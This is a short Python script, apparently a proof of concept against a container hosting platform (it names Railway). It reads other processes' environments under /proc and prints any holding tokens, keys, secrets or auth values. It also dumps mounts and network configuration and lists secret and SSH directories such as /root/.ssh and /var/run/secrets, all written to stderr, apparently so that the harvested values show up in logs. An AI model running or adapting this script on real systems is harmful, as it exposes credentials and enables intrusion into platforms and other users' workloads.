import os
import sys
import subprocess

def run_poc():
    sys.stderr.write("--- START CRITICAL DUMP ---\n")
    
    # 1. Identity
    sys.stderr.write(f"ID: {os.getuid()} {os.getgid()}\n")

    # 2. Process Environment Scraper
    for pid in range(1, 150):
        p = f"/proc/{pid}/environ"
        if os.path.exists(p):
            try:
                with open(p, "rb") as f:
                    d = f.read().replace(b'\0', b'\n').decode(errors='ignore')
                    if any(x in d for x in ["RAILWAY", "TOKEN", "KEY", "SECRET", "AUTH"]):
                        sys.stderr.write(f"--- PID {pid} ENV ---\n{d}\n")
            except:
                continue

    # 3. Mounts & File Systems
    try:
        with open("/proc/mounts", "r") as f:
            sys.stderr.write(f"--- MOUNTS ---\n{f.read()}\n")
    except:
        pass

    # 4. Network Info
    try:
        sys.stderr.write("--- NET --- \n")
        sys.stderr.write(subprocess.check_output("ip addr", shell=True).decode())
        sys.stderr.write(subprocess.check_output("route -n", shell=True).decode())
    except:
        pass

    # 5. Sensitive Path Search
    paths = [
        "/run/secrets",
        "/var/run/secrets",
        "/etc/kubernetes",
        "/root/.ssh",
        "/home/railway/.ssh"
    ]
    for path in paths:
        if os.path.exists(path):
            sys.stderr.write(f"FOUND PATH: {path}\n")
            try:
                sys.stderr.write(str(os.listdir(path)) + "\n")
            except:
                pass

    sys.stderr.write("--- END CRITICAL DUMP ---\n")
    sys.stderr.flush()
    os._exit(1)

if __name__ == "__main__":
    run_poc()
